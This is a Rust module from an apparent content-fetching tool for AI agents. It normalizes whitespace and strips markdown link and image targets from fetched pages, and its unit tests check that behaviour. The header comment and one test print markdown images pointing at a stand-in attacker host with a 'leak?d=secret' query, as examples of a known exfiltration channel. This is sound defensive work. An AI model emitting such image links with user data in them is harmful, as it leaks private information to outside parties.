//! Serialize extracted content into clean, agent-safe text.
//!
//! The output is plain text with two deliberate properties:
//!
//! - **No link or image markup survives.** A fetched page is untrusted; a
//!   markdown image in it (`![](https://attacker/?data=…)`) is a known
//!   exfiltration channel once a client renders it. Link text is kept, the URL
//!   is not.
//! - **Whitespace is normalized** so the model reads prose, not layout, and the
//!   text is cheap to tokenize.

/// One extracted page: the readable text plus the metadata a caller can cite.
#[derive(Debug, Clone, serde::Serialize)]
pub struct Page {
    pub title: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub byline: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub published: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub site: Option<String>,
    pub text: String,
    /// A client-side redirect target the caller may follow (after the guard);
    /// never serialized to a model, which should not be told to fetch it.
    #[serde(skip)]
    pub redirect: Option<String>,
}

/// Collapse whitespace, drop empty lines runs, and neutralize any residual
/// link or image syntax that survived extraction.
pub(super) fn clean(text: &str) -> String {
    let without_targets = strip_link_targets(text);
    let mut out = String::with_capacity(without_targets.len());
    let mut blank = false;
    for line in without_targets.lines() {
        let line = line.split_whitespace().collect::<Vec<_>>().join(" ");
        if line.is_empty() {
            // At most one blank line between paragraphs.
            if !blank && !out.is_empty() {
                out.push('\n');
            }
            blank = true;
            continue;
        }
        blank = false;
        out.push_str(line.trim());
        out.push('\n');
    }
    out.trim().to_string()
}

/// Remove markdown/HTML link and image targets, keeping the human text. This is
/// the exfiltration guard: page content must not be able to carry a URL that a
/// client would fetch on the model's behalf.
fn strip_link_targets(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.char_indices().peekable();
    while let Some((_, ch)) = chars.next() {
        match ch {
            // Markdown image: ![alt](url) -> alt. Link: [text](url) -> text.
            '!' if chars.peek().map(|(_, c)| *c) == Some('[') => {
                chars.next();
                out.push_str(&take_bracketed(&mut chars, true));
            }
            '[' => out.push_str(&take_bracketed(&mut chars, true)),
            // A bare URL is not a fetch trigger for the model, but an inline
            // image autoload is; leave bare URLs as text.
            c => out.push(c),
        }
    }
    out
}

/// Consume `[text](target)` starting after the `[`, returning `text`. When the
/// shape does not match, the consumed characters are returned unchanged.
fn take_bracketed(
    chars: &mut std::iter::Peekable<std::str::CharIndices<'_>>,
    keep_text: bool,
) -> String {
    let mut text = String::new();
    let mut depth = 1usize;
    for (_, c) in chars.by_ref() {
        match c {
            '[' => {
                depth += 1;
                text.push(c);
            }
            ']' => {
                depth -= 1;
                if depth == 0 {
                    break;
                }
                text.push(c);
            }
            _ => text.push(c),
        }
    }
    // Consume an immediately following `(target)`.
    if chars.peek().map(|(_, c)| *c) == Some('(') {
        chars.next();
        let mut paren = 1usize;
        for (_, c) in chars.by_ref() {
            match c {
                '(' => paren += 1,
                ')' => {
                    paren -= 1;
                    if paren == 0 {
                        break;
                    }
                }
                _ => {}
            }
        }
    }
    if keep_text {
        text
    } else {
        String::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn whitespace_is_collapsed_and_paragraphs_keep_one_blank_line() {
        // Runs of spaces collapse; runs of blank lines become exactly one.
        assert_eq!(clean("a   b\n\n\n\nc"), "a b\n\nc");
        assert_eq!(clean("only   line"), "only line");
        assert_eq!(clean("  \n\n  "), "");
    }

    #[test]
    fn markdown_images_are_removed_and_links_reduced_to_text() {
        assert_eq!(
            clean("see [the docs](https://x.example/a) now"),
            "see the docs now"
        );
        assert_eq!(
            clean("logo ![x](https://attacker.example/leak?d=secret) here"),
            "logo x here"
        );
    }

    #[test]
    fn bare_urls_survive_as_text() {
        // A bare URL does not autoload; keeping it is useful and safe.
        assert_eq!(
            clean("read https://example.com/x"),
            "read https://example.com/x"
        );
    }
}
